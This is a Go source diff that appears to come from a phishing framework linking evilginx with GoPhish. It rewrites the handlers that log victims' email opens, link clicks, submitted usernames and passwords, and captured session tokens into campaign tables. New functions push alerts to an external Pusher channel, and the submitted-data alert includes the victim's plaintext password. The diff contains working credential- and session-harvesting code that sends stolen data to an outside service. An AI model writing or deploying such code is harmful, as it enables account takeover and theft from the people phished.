@@ -6,80 +6,78 @@ import (
 
     "github.com/tidwall/buntdb"
 
-    "errors"
+    pusher "github.com/pusher/pusher-http-go/v5"
+    "net/url"
     "fmt"
     "time"
-    "os/user"
-    "path/filepath"
     _ "github.com/mattn/go-sqlite3"
     "github.com/jinzhu/gorm"
 )
 
-var egp_db *gorm.DB
+var gp_db *gorm.DB
 
 type Database struct {
     path string
     db   *buntdb.DB
 }
 
-type SentResults struct {
-    Id          int64   `json:"id"`
-    UserId      int64   `json:"user_id"`
-    RId         string  `json:"rid"`
-    Victim      string  `json:"victim"`
-    SMSTarget   bool    `json:"sms_target"`
+type BaseRecipient struct {
+    Email     string `json:"email"`
+    FirstName string `json:"first_name"`
+    LastName  string `json:"last_name"`
+    Position  string `json:"position"`
 }
 
-type OpenedResults struct {
-    Id          int64   `json:"id"`
-    UserId      int64   `json:"user_id"`
-    RId         string  `json:"rid"`
-    Victim      string  `json:"victim"`
-    Browser		string  `json:"browser"`
-    SMSTarget   bool    `json:"sms_target"`
+type Result struct {
+    Id           int64     `json:"-"`
+    CampaignId   int64     `json:"-"`
+    UserId       int64     `json:"-"`
+    RId          string    `json:"id"`
+    Status       string    `json:"status" sql:"not null"`
+    IP           string    `json:"ip"`
+    Latitude     float64   `json:"latitude"`
+    Longitude    float64   `json:"longitude"`
+    SendDate     time.Time `json:"send_date"`
+    Reported     bool      `json:"reported" sql:"not null"`
+    ModifiedDate time.Time `json:"modified_date"`
+    BaseRecipient
+    SMSTarget    bool 		`json:"sms_target"`
 }
 
-type ClickedResults struct {
-    Id          int64   `json:"id"`
-    UserId      int64   `json:"user_id"`
-    RId         string  `json:"rid"`
-    Victim      string  `json:"victim"`
-    Browser		string  `json:"browser"`
-    SMSTarget   bool    `json:"sms_target"`
+type Event struct {
+    Id         int64     `json:"-"`
+    CampaignId int64     `json:"campaign_id"`
+    Email      string    `json:"email"`
+    Time       time.Time `json:"time"`
+    Message    string    `json:"message"`
+    Details    string    `json:"details"`
 }
 
-type SubmittedResults struct {
-    Id          int64   `json:"id"`
-    UserId      int64   `json:"user_id"`
-    RId         string  `json:"rid"`
-    Username    string  `json:"username"`
-    Password    string  `json:"password"`
-    Browser		string  `json:"browser"`
+type EventDetails struct {
+    Payload url.Values        `json:"payload"`
+    Browser map[string]string `json:"browser"`   
 }
 
-type CapturedResults struct {
-    Id          int64   `json:"id"`
-    UserId      int64   `json:"user_id"`
-    RId         string  `json:"rid"`
-    Tokens      string  `json:"tokens"`
-    Browser		string  `json:"browser"`
+type EventError struct {
+    Error string `json:"error"`
 }
 
-var ErrRIdNotFound = errors.New("RId not found in clicked_results table")
+type Pusher struct {
+    AppID          string  `json:"pusher_app_id"`
+    AppKey         string  `json:"pusher_app_key"`
+    Secret         string  `json:"pusher_app_secret"`
+    Cluster        string  `json:"pusher_app_cluster"`
+    EncryptKey     string  `json:"pusher_encrypt_key"`
+    ChannelName    string  `json:"pusher_channel_name"`
+    Enabled        bool    `json:"enable_pusher"`
+}
 
-func SetupEGP() error {
-    usr, err := user.Current()
-    if err != nil {
-        fmt.Printf("[-] Getting current user context failed!\n")
-        return err
-    }
-    cfg_dir := filepath.Join(usr.HomeDir, ".evilginx")
-    db_path := filepath.Join(cfg_dir, "evilgophish.db")
-
+func SetupGPDB(path string) error {
     // Open our database connection
+    var err error
     i := 0
     for {
-        egp_db, err = gorm.Open("sqlite3", db_path)
+        gp_db, err = gorm.Open("sqlite3", path)
         if err == nil {
             break
         }
@@ -91,7 +89,7 @@ func SetupEGP() error {
         fmt.Println("waiting for database to be up...")
         time.Sleep(5 * time.Second)
     }
-            
+
     return nil
 }
 
@@ -134,91 +132,247 @@ func moddedTokensToJSON(tokens map[string]map[string]*Token) string {
     return string(json)
 }
 
-func HandleEmailOpened (rid string, browser map[string]string) error {
-    sentResult := SentResults{}
-    query := egp_db.Table("sent_results").Where("r_id=?", rid)
-    err := query.Scan(&sentResult).Error
+func AddEvent(e *Event, campaignID int64) error {
+    e.CampaignId = campaignID
+    e.Time = time.Now().UTC()
+
+    return gp_db.Save(e).Error
+}
+
+func (r *Result) createEvent(status string, details interface{}) (*Event, error) {
+    e := &Event{Email: r.Email, Message: status}
+    if details != nil {
+        dj, err := json.Marshal(details)
+        if err != nil {
+            return nil, err
+        }
+        e.Details = string(dj)
+    }
+    AddEvent(e, r.CampaignId)
+    return e, nil
+}
+
+func HandleEmailOpened (rid string, browser map[string]string, client Pusher) error {
+    r := Result{}
+    query := gp_db.Table("results").Where("r_id=?", rid)
+    err := query.Scan(&r).Error
     if err != nil {
         return err
-    } else if sentResult.RId == "" {
-        return ErrRIdNotFound
     } else {
-        openedEntry := OpenedResults{}
-        openedEntry.Id = sentResult.Id
-        openedEntry.RId = rid
-        openedEntry.UserId = sentResult.UserId
-        openedEntry.Victim = sentResult.Victim
-        openedEntry.SMSTarget = sentResult.SMSTarget
-        data, err := json.Marshal(browser)
+        res := Result{}
+        ed := EventDetails{}
+        ed.Browser = browser
+        ed.Payload = map[string][]string{"client_id": []string{rid}}
+        res.Id = r.Id
+        res.RId = r.RId
+        res.UserId = r.UserId
+        res.CampaignId = r.CampaignId
+        res.IP = "127.0.0.1"
+        res.Latitude = 0.000000
+        res.Longitude = 0.000000
+        res.Reported = false
+        res.BaseRecipient = r.BaseRecipient
+        if client.Enabled {
+            if r.SMSTarget {
+                r.PusherNotifySMSOpened(client)
+            } else {
+                r.PusherNotifyEmailOpened(client)
+            }
+        }
+        event, err := res.createEvent("Email/SMS Opened", ed)
         if err != nil {
             return err
         }
-        openedEntry.Browser = string(data)
-        return egp_db.Save(openedEntry).Error
+        if r.Status == "Clicked Link" || r.Status == "Submitted Data" {
+            return nil
+        }
+        res.Status = "Email/SMS Opened"
+        res.ModifiedDate = event.Time
+        return gp_db.Save(res).Error
     }
 }
 
-func HandleClickedLink (rid string, browser map[string]string) error {
-    sentResult := SentResults{}
-    query := egp_db.Table("sent_results").Where("r_id=?", rid)
-    err := query.Scan(&sentResult).Error
+func HandleClickedLink (rid string, browser map[string]string, client Pusher) error {
+    r := Result{}
+    query := gp_db.Table("results").Where("r_id=?", rid)
+    err := query.Scan(&r).Error
     if err != nil {
         return err
-    } else if sentResult.RId == "" {
-        return ErrRIdNotFound
     } else {
-        clickedEntry := ClickedResults{}
-        clickedEntry.Id = sentResult.Id
-        clickedEntry.RId = rid
-        clickedEntry.UserId = sentResult.UserId
-        clickedEntry.Victim = sentResult.Victim
-        clickedEntry.SMSTarget = sentResult.SMSTarget
-        data, err := json.Marshal(browser)
+        res := Result{}
+        ed := EventDetails{}
+        ed.Browser = browser
+        ed.Payload = map[string][]string{"client_id": []string{rid}}
+        res.Id = r.Id
+        res.RId = r.RId
+        res.UserId = r.UserId
+        res.CampaignId = r.CampaignId
+        res.IP = "127.0.0.1"
+        res.Latitude = 0.000000
+        res.Longitude = 0.000000
+        res.Reported = false
+        res.BaseRecipient = r.BaseRecipient
+        event, err := res.createEvent("Clicked Link", ed)
         if err != nil {
             return err
         }
-        clickedEntry.Browser = string(data)
-        return egp_db.Save(clickedEntry).Error
+        if r.Status == "Email/SMS Sent" {
+            HandleEmailOpened(rid, browser, client)
+        }
+        if client.Enabled {
+            r.PusherNotifyClickedLink(client)
+        }
+        if r.Status == "Submitted Data" {
+            return nil
+        }
+        res.Status = "Clicked Link"
+        res.ModifiedDate = event.Time
+        return gp_db.Save(res).Error
     }
 }
 
-func HandleSubmittedData (rid string, username string, password string) error {
-    clickedResult := ClickedResults{}
-    query := egp_db.Table("clicked_results").Where("r_id=?", rid)
-    err := query.Scan(&clickedResult).Error
+func HandleSubmittedData (rid string, username string, password string, browser map[string]string, client Pusher) error {
+    r := Result{}
+    query := gp_db.Table("results").Where("r_id=?", rid)
+    err := query.Scan(&r).Error
     if err != nil {
         return err
-    } else if clickedResult.RId == "" {
-        return ErrRIdNotFound
     } else {
-        submittedEntry := SubmittedResults{}
-        submittedEntry.Id = clickedResult.Id
-        submittedEntry.RId = rid
-        submittedEntry.UserId = clickedResult.UserId
-        submittedEntry.Username = username
-        submittedEntry.Password = password
-        submittedEntry.Browser = clickedResult.Browser
-        return egp_db.Save(submittedEntry).Error
+        res := Result{}
+        ed := EventDetails{}
+        ed.Browser = browser
+        ed.Payload = map[string][]string{"Username": []string{username}, "Password": []string{password}}
+        res.Id = r.Id
+        res.RId = r.RId
+        res.UserId = r.UserId
+        res.CampaignId = r.CampaignId
+        res.IP = "127.0.0.1"
+        res.Latitude = 0.000000
+        res.Longitude = 0.000000
+        res.Reported = false
+        res.BaseRecipient = r.BaseRecipient
+        if client.Enabled {
+            r.PusherNotifySubmittedData(client, username, password)
+        }
+        event, err := res.createEvent("Submitted Data", ed)
+        if err != nil {
+            return err
+        }
+        if r.Status == "Captured Session" {
+            return nil
+        }
+        res.Status = "Submitted Data"
+        res.ModifiedDate = event.Time
+        return gp_db.Save(res).Error
     }
 }
 
-func HandleCapturedSession (rid string, tokens map[string]map[string]*Token) error {
-    clickedResult := ClickedResults{}
-    query := egp_db.Table("clicked_results").Where("r_id=?", rid)
-    err := query.Scan(&clickedResult).Error
+func HandleCapturedSession (rid string, tokens map[string]map[string]*Token, browser map[string]string, client Pusher) error {
+    r := Result{}
+    query := gp_db.Table("results").Where("r_id=?", rid)
+    err := query.Scan(&r).Error
     if err != nil {
         return err
-    } else if clickedResult.RId == "" {
-        return ErrRIdNotFound
     } else {
-        capturedEntry := CapturedResults{}
-        capturedEntry.Id = clickedResult.Id
-        capturedEntry.RId = rid
-        capturedEntry.UserId = clickedResult.UserId
-        capturedEntry.Browser = clickedResult.Browser
+        res := Result{}
+        ed := EventDetails{}
+        ed.Browser = browser
         json_tokens := moddedTokensToJSON(tokens)
-        capturedEntry.Tokens = json_tokens
-        return egp_db.Save(capturedEntry).Error
+        ed.Payload = map[string][]string{"Tokens": {json_tokens}}
+        res.Id = r.Id
+        res.RId = r.RId
+        res.UserId = r.UserId
+        res.CampaignId = r.CampaignId
+        res.IP = "127.0.0.1"
+        res.Latitude = 0.000000
+        res.Longitude = 0.000000
+        res.Reported = false
+        res.BaseRecipient = r.BaseRecipient
+        if client.Enabled {
+            r.PusherNotifyCapturedSession(client)
+        }
+        event, err := res.createEvent("Captured Session", ed)
+        if err != nil {
+            return err
+        }
+        res.Status = "Captured Session"
+        res.ModifiedDate = event.Time
+        return gp_db.Save(res).Error
+    }
+}
+
+func (r *Result) PusherNotifyEmailOpened(client Pusher) {
+    pusherClient := pusher.Client{
+        AppID: client.AppID,
+        Key: client.AppKey,
+        Secret: client.Secret,
+        Cluster: client.Cluster,
+        EncryptionMasterKeyBase64: client.EncryptKey,
+    }
+    data := map[string]string{"event": "Email Opened", "time": r.ModifiedDate.String(), "message": "Email has been opened by victim: <strong>" + r.Email + "</strong>"}
+    err := pusherClient.Trigger(client.ChannelName, "event", data)
+    if err != nil {
+        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+    }
+}
+
+func (r *Result) PusherNotifySMSOpened(client Pusher) {
+    pusherClient := pusher.Client{
+        AppID: client.AppID,
+        Key: client.AppKey,
+        Secret: client.Secret,
+        Cluster: client.Cluster,
+        EncryptionMasterKeyBase64: client.EncryptKey,
+    }
+    data := map[string]string{"event": "SMS Opened", "time": r.ModifiedDate.String(), "message": "SMS has been opened by victim: <strong>" + r.Email + "</strong>"}
+    err := pusherClient.Trigger(client.ChannelName, "event", data)
+    if err != nil {
+        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+    }
+}
+
+func (r *Result) PusherNotifyClickedLink(client Pusher) {
+    pusherClient := pusher.Client{
+        AppID: client.AppID,
+        Key: client.AppKey,
+        Secret: client.Secret,
+        Cluster: client.Cluster,
+        EncryptionMasterKeyBase64: client.EncryptKey,
+    }
+    data := map[string]string{"event": "Clicked Link", "time": r.ModifiedDate.String(), "message": "Link has been clicked by victim: <strong>" + r.Email + "</strong>"}
+    err := pusherClient.Trigger(client.ChannelName, "event", data)
+    if err != nil {
+        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+    }
+}
+
+func (r *Result) PusherNotifySubmittedData(client Pusher, username string, password string) {
+    pusherClient := pusher.Client{
+        AppID: client.AppID,
+        Key: client.AppKey,
+        Secret: client.Secret,
+        Cluster: client.Cluster,
+        EncryptionMasterKeyBase64: client.EncryptKey,
+    }
+    data := map[string]string{"event": "Submitted Data", "time": r.ModifiedDate.String(), "message": "Victim <strong>" + r.Email + "</strong> has submitted data! Details:<br><strong>Username:</strong> " + username + "<br><strong>Password:</strong> " + password}
+    err := pusherClient.Trigger(client.ChannelName, "event", data)
+    if err != nil {
+        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+    }
+}
+
+func (r *Result) PusherNotifyCapturedSession(client Pusher) {
+    pusherClient := pusher.Client{
+        AppID: client.AppID,
+        Key: client.AppKey,
+        Secret: client.Secret,
+        Cluster: client.Cluster,
+        EncryptionMasterKeyBase64: client.EncryptKey,
+    }
+    data := map[string]string{"event": "Captured Session", "time": r.ModifiedDate.String(), "message": "Captured session for victim: <strong>" + r.Email + "</strong>! View full token JSON in GoPhish dashboard!"}
+    err := pusherClient.Trigger(client.ChannelName, "event", data)
+    if err != nil {
+        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
     }
 }
 
